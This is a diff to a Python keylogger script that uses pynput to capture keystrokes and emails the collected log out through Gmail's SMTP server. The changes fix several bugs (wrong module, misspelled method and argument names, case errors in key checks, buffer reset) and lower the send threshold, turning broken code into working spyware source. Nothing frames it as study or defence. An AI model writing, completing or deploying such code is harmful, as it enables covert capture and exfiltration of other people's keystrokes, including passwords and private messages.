@@ -1,4 +1,4 @@
-import getpass, smtpd, ssl
+import getpass, smtplib, ssl
 from pynput.keyboard import Key, Listener
 #list of imports 
 
@@ -14,15 +14,16 @@ print('''
 
 
 #email dump
-emailAddr = input('Enter Email: ')
-key = getpass.getpass(promt='Email Password: ', stream = None)
-server = smtpd.SMTP_SSL('smtp.gmail.com', 465)
-server.login(emailAddr, key)
+
+emailAddr = input('Enter email: ')
+password = getpass.getpass(prompt='Enter Password: ', stream=None)
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login(emailAddr, password)
 
 #logger variables 
 key_log = ''
 word = ''
-character_lim = 100
+character_lim = 50
 
 #key logger function 
 def on_press(key):
@@ -31,29 +32,30 @@ def on_press(key):
     global word
     global character_lim
     global emailAddr
+
     #filters for certain keys 
-    if key == Key.space or Key == Key.enter or Key == Key.tab:
-        word += ''
+    if key == Key.space or key == Key.enter or key == Key.tab:
+        word += ' '
         key_log += word
-        word =''
+        word = ''
         if len(key_log) >= character_lim:
             email_log()
-            key_log 
-    elif Key == Key.shift_r or Key == Key.shift_l:
-        return 
-    elif Key == Key.backspace:
+            key_log = ''
+    
+    elif key == Key.shift_r or key == Key.shift_l:
+        return
+    elif key == Key.backspace:
         word = word[:-1]
-    elif Key == Key.esc:
-        return False
-    #sets word variable equal to char 
     else:
-        char = f'{Key}'
+        char = f'{key}'
         char = char[1:-1]
         word += char
+    if key == Key.esc:
+        return False
 
 #email send function 
 def email_log():
-    server.senmail(
+    server.sendmail(
         emailAddr,
         emailAddr,
         key_log
